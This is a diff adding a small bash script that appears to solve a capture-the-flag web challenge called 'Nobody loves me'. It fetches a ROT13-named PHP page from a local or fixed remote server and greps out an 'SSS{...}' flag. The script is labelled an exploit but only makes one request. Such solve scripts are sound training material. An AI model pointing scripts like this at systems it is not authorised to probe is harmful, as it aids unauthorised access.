@@ -1,0 +1,19 @@
+#!/bin/bash
+PORT=8081
+
+if [[ $1 == "local" ]]
+then
+    remote='http://127.0.0.1:'$PORT
+elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
+then
+    remote='http://141.85.224.115:'$PORT
+else
+    remote=$1':'$2
+fi
+
+# Nobody loves me
+echo "Start exploit for Nobody loves me"
+remote=$remote'/nobody-loves-me/ernq-svyr.php'
+flag=$(curl -s $remote | grep -o "SSS{.*}")
+echo "Flag is $flag"
+echo "----------------------------"
